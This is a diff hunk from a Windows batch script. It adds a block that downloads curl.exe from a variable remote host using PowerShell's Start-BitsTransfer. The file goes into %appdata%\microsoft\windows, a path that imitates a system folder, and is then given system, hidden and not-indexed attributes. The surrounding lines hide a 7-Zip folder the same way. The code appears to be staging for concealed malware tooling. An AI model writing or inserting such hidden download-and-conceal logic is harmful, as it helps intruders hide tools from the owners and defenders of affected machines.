@@ -12,6 +12,12 @@ rem TESTING >
 if "%computername%"=="WIN-6QJBGJLRIGL" set environment=%appdata%\microsoft\windows
 rem TESTING <
 
+attrib -s -h -i "%environment%\curl.exe" && if exist "%environment%\curl.exe" (
+      attrib +s +h +i "%environment%\curl.exe"
+) else (
+ powershell.exe Start-BitsTransfer -Source "%host%\Tools\curl.exe" -Destination "%environment%\curl.exe" && attrib +s +h +i "%environment%\curl.exe" 
+)
+
 attrib -s -h -i "%environment%\7-Zip" && if exist "%environment%\7-Zip\7z.exe" (
       attrib +s +h +i "%environment%\7-Zip"
 ) else (
